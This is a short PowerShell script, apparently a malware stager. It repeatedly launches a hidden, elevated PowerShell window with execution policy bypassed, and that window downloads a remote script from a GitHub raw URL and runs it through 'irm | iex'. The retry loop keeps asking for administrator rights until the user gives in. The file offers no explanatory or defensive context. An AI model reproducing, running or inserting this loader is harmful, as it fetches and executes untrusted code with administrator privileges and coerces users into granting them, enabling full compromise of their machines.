do {
    try {
        Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://github.com/afnanr653/aerbhsrt/raw/refs/heads/main/its.ps1 | iex"' -Verb RunAs
        $success = $true
    } catch {
        $success = $false
    }
} until ($success)